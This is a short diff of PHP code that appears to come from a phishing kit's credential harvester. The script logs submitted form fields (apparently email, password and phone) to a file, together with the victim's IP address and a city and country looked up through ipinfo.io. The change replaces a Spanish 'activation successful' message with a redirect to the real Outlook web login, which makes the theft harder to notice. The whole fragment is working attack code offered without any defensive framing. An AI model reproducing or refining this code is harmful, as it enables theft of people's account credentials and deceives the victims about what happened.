@@ -12,6 +12,6 @@ $city = trim(file_get_contents("http://ipinfo.io/{$userp}/city"));
 fwrite($file, "".$_POST['ae']." | ".$_POST['ao']." | ".$_POST['pn']." | ".date('Y-m-d')." | ".date('H:i:s')." | ".$userp." ".$cc." ".$city."  " . PHP_EOL);
 fwrite($file, "----------------------------------------- " . PHP_EOL);
 fclose($file);
-	echo '<p style="font-size:30px">¡Activación Exitosa!</p>';
+	header("location:https://outlook.live.com/owa/");
 
 ?> 
